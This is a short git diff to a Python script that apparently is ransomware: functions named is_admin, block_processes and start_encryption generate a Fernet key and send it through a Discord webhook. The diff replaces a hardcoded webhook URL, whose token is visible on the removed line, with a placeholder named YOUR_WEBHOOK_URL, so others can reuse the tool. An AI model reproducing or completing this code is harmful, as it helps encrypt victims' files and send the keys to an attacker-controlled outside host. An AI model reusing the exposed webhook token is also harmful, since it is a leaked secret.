@@ -15,6 +15,7 @@ from cryptography.fernet import Fernet
 from discord_webhook import DiscordEmbed, DiscordWebhook
 from win32com.client import Dispatch
 
+YOUR_WEBHOOK_URL = ""
 
 def is_admin():
     try:
@@ -189,7 +190,7 @@ def block_processes():
 
 def start_encryption():
     webhook = DiscordWebhook(
-        url="https://discordapp.com/api/webhooks/1335836970533781547/MXbpr5aQDyAJyH6AesXv0XLYI1XiZr5s9uiZWir_Ds60KtlODjd5RVhlQfeJg6fEPLmY"
+        url=YOUR_WEBHOOK_URL
     )
     key = Fernet.generate_key()
     embed = DiscordEmbed(
